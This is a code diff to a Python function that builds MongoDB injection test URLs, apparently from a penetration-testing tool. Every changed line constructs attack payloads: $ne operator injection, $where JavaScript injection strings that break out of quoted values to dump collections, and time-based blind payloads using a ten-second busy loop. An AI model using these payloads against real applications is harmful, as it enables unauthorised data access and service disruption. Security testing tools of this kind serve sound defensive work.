@@ -611,16 +611,16 @@ def buildUri(origUri, randValue):
 	if paramName[x] == injOpt:
 	    evilUri += paramName[x] + "=" + randValue + "&"
 	    neqUri += paramName[x] + "[$ne]=" + randValue + "&"
-	    whereStrUri += paramName[x] + "=a'; return db.a.find(); var dummy='!" + "&"
-	    whereIntUri += paramName[x] + "=1; return db.a.find(); var dummy=1" + "&"
-	    whereOneStr += paramName[x] + "=a'; return db.a.findOne(); var dummy='!" + "&"
-	    whereOneInt += paramName[x] + "=a; return db.a.findOne(); var dummy=1" + "&"
+	    whereStrUri += paramName[x] + "=a'; return db." + fakeColl + ".find(); var dummy='!" + "&"
+	    whereIntUri += paramName[x] + "=1; return db." + fakeColl + ".find(); var dummy=1" + "&"
+	    whereOneStr += paramName[x] + "=a'; return db." + fakeColl + ".findOne(); var dummy='!" + "&"
+	    whereOneInt += paramName[x] + "=a; return db." + fakeColl + ".findOne(); var dummy=1" + "&"
 	    timeStrUri  += paramName[x] + "=a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy='!" + "&"
 	    timeIntUri  += paramName[x] + "=1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1" + "&"
 	    strThisNeqUri += paramName[x] + "=a'; return this." + fakeColl +  " != '" + randValue + "'; var dummy='!" + "&"
 	    intThisNeqUri += paramName[x] + "=1; return this." + fakeColl + " !=" + randValue + "; var dummy=1" + "&"
-	    strNullUri += paramName[x] + "=a'; return this." + fakeColl + " = null; var dummy='!" + "&"
-	    intNullUri += paramName[x] + "=1; return this." +fakeColl + " = null; var dummy=1" + "&"
+	    strNullUri += paramName[x] + "=a'; return this." + fakeColl + " = [null]; var dummy='!" + "&"
+	    intNullUri += paramName[x] + "=1; return this." +fakeColl + " = [null]; var dummy=1" + "&"
 
 	else:
 	    evilUri += paramName[x] + "=" + paramValue[x] + "&"
